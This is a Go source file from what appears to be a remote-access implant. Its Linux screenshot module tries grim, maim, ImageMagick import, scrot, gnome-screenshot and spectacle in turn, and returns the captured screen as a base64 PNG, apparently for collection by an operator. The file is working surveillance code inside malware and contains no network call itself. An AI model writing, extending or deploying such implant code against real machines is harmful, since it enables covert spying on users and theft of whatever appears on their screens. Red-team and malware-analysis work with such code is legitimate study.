// implant/screenshot_linux.go
//go:build linux

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func init() {
	// Assign the Linux-specific implementation to the global takeScreenshot variable.
	takeScreenshot = linuxTakeScreenshot
}

// linuxScreenshotUtility defines a structure for trying different screenshot tools.
type linuxScreenshotUtility struct {
	name         string
	cmd          string
	argsToStdout []string // Arguments to make the tool print PNG image data to stdout.
	argsToFile   []string // Arguments to make the tool save to a file. Filename will be appended.
}

// List of screenshot utilities to try on Linux, in order of preference.
var linuxScreenshotUtilities = []linuxScreenshotUtility{
	{
		name:         "grim (Wayland)",
		cmd:          "grim",
		argsToStdout: []string{"-t", "png", "-"}, // Output PNG to stdout
	},
	{
		name:         "maim (X11)",
		cmd:          "maim",
		argsToStdout: []string{"-f", "png"}, // Output PNG to stdout by default, -f png for explicit format
	},
	{
		name:         "import (ImageMagick, X11)",
		cmd:          "import",
		argsToStdout: []string{"-window", "root", "png:-"}, // Capture root window, output PNG to stdout
		argsToFile:   []string{"-window", "root"},          // Filename will be appended by the function
	},
	{
		name: "scrot (X11)",
		cmd:  "scrot",
		// Attempt to output to stdout. Some versions might support this.
		// -o: overwrite, -z: silent (no beep/countdown)
		argsToStdout: []string{"-o", "-z", "/dev/stdout"},
		// Fallback: save to a temporary file.
		argsToFile: []string{"-o", "-z"}, // Filename will be appended
	},
	{
		name:       "gnome-screenshot (GNOME Session)",
		cmd:        "gnome-screenshot",
		argsToFile: []string{"-f"}, // -f <filename>. Filename will be appended.
	},
	{
		name:       "spectacle (KDE Session)",
		cmd:        "spectacle",
		argsToFile: []string{"--fullscreen", "--batch", "--output"}, // --output <filename>. Filename will be appended.
	},
}

// linuxTakeScreenshot attempts to capture the entire screen on Linux.
// It iterates through a list of known screenshot utilities and tries to use them.
// Returns a base64 encoded string of the PNG image or an error.
func linuxTakeScreenshot() (string, error) {
	var lastErr error

	for _, util := range linuxScreenshotUtilities {
		cmdPath, err := exec.LookPath(util.cmd)
		if err != nil {
			// Utility not found, record error and try next
			lastErr = fmt.Errorf("utility %s not found in PATH: %w", util.cmd, err)
			continue
		}

		// Attempt 1: Capture to stdout if argsToStdout are defined
		if len(util.argsToStdout) > 0 {
			cmd := exec.Command(cmdPath, util.argsToStdout...)
			var outBuffer bytes.Buffer
			var errBuffer bytes.Buffer
			cmd.Stdout = &outBuffer
			cmd.Stderr = &errBuffer
			cmd.Env = os.Environ() // Inherit environment (important for DISPLAY, WAYLAND_DISPLAY, DBUS_SESSION_BUS_ADDRESS)

			err := cmd.Run()
			if err == nil && outBuffer.Len() > 0 {
				// Success
				return base64.StdEncoding.EncodeToString(outBuffer.Bytes()), nil
			}

			// Record error for this attempt
			errMsg := ""
			if err != nil {
				errMsg = err.Error()
			}
			stderrStr := strings.TrimSpace(errBuffer.String())
			if stderrStr != "" {
				errMsg = fmt.Sprintf("%s (stderr: %s)", errMsg, stderrStr)
			}
			if err != nil { // Command execution failed
				lastErr = fmt.Errorf("failed executing %s (stdout method): %s", util.name, errMsg)
			} else if outBuffer.Len() == 0 { // Command ran but produced no output
				lastErr = fmt.Errorf("%s (stdout method) produced no output; %s", util.name, errMsg)
			}
			// Continue to next method or utility
		}

		// Attempt 2: Capture to a temporary file if argsToFile are defined
		if len(util.argsToFile) > 0 {
			tmpFile, err := os.CreateTemp("", "implant-screenshot-*.png")
			if err != nil {
				lastErr = fmt.Errorf("failed to create temp file for %s: %w", util.name, err)
				continue // Try next utility or method
			}
			tmpFileName := tmpFile.Name()
			tmpFile.Close() // Close the file handle, command will write to the path

			// Ensure temporary file is cleaned up
			defer func(path string) { os.Remove(path) }(tmpFileName)

			fullArgs := append(util.argsToFile, tmpFileName)
			cmd := exec.Command(cmdPath, fullArgs...)
			var errBuffer bytes.Buffer
			cmd.Stderr = &errBuffer
			cmd.Env = os.Environ() // Inherit environment

			err = cmd.Run()
			if err == nil {
				imgBytes, readErr := os.ReadFile(tmpFileName)
				if readErr != nil {
					lastErr = fmt.Errorf("failed to read temp screenshot file %s for %s: %w", tmpFileName, util.name, readErr)
					os.Remove(tmpFileName) // Clean up now
					continue
				}
				os.Remove(tmpFileName) // Clean up now
				if len(imgBytes) > 0 {
					return base64.StdEncoding.EncodeToString(imgBytes), nil
				}
				lastErr = fmt.Errorf("temp screenshot file %s for %s was empty; stderr: %s", tmpFileName, util.name, errBuffer.String())
				continue
			}

			// Record error for this attempt
			errMsg := err.Error()
			stderrStr := strings.TrimSpace(errBuffer.String())
			if stderrStr != "" {
				errMsg = fmt.Sprintf("%s (stderr: %s)", errMsg, stderrStr)
			}
			lastErr = fmt.Errorf("failed executing %s (file method): %s", util.name, errMsg)
			os.Remove(tmpFileName) // Clean up now on error
		}
	}

	if lastErr != nil {
		return "", fmt.Errorf("all screenshot attempts failed on Linux. Last error: %w", lastErr)
	}
	return "", fmt.Errorf("no suitable screenshot utility found or all configured attempts failed on Linux")
}
